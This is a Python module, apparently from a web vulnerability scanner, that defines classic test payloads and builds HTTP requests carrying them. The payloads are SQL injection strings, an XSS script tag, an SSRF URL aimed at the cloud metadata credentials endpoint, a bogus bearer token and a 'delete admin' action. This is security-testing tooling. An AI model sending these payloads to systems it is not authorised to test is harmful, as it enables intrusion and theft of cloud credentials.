"""Payload definitions and request generator for active testing mode.

The module provides a small dictionary of common vulnerability test vectors and a helper
`generate_requests` that builds a list of `httpx.Request` objects for each vector.
"""

from __future__ import annotations

import json
from typing import Iterable, List

import httpx

# ---------------------------------------------------------------------------
# Payload definitions – each key maps to a dictionary of parameter/value pairs.
# Extend this mapping as needed; the values are deliberately simple and safe.
# ---------------------------------------------------------------------------
PAYLOADS: dict[str, dict[str, str]] = {
    "idor": {"id": "1' OR '1'='1"},
    "xss": {"q": "<script>alert(1)</script>"},
    "ssrf": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
    "sqli": {"username": "' OR 1=1--"},
    "auth_bypass": {"Authorization": "Bearer invalid-token"},
    # Business‑logic example – can be overridden via a custom YAML/JSON file.
    "biz_logic": {"action": "delete", "resource": "admin"},
}


def _build_url(base: str, params: dict[str, str]) -> str:
    """Return a URL‑encoded query string appended to ``base``.

    ``base`` may already contain a query component – we simply concatenate with '&'.
    """
    if not params:
        return base
    query = "&".join(f"{k}={httpx.utils.quote(v)}" for k, v in params.items())
    connector = "&" if "?" in base else "?"
    return f"{base}{connector}{query}"


def generate_requests(base_url: str) -> List[httpx.Request]:
    """Create a list of ``httpx.Request`` objects for each payload.

    For each payload we issue a **POST** request with a JSON body containing the
    payload dictionary. If the payload contains an ``Authorization`` header key,
    we treat it specially and send a ``GET`` request with the header set.
    """
    requests: List[httpx.Request] = []
    for name, data in PAYLOADS.items():
        # Heuristic: if a payload looks like a header (e.g. "Authorization"),
        # we send it as a GET with that header; otherwise we POST JSON.
        if any(k.lower() in {"authorization", "auth", "basic", "bearer"} for k in data):
            headers = {k: v for k, v in data.items()}
            req = httpx.Request("GET", base_url, headers=headers)
        else:
            # POST with JSON body – also expose a query‑string version for GET‑only services.
            req = httpx.Request("POST", base_url, json=data)
            # Additionally, a GET version with the same params in the URL for services that only accept query strings.
            get_req = httpx.Request("GET", _build_url(base_url, data))
            requests.append(get_req)
        requests.append(req)
    return requests
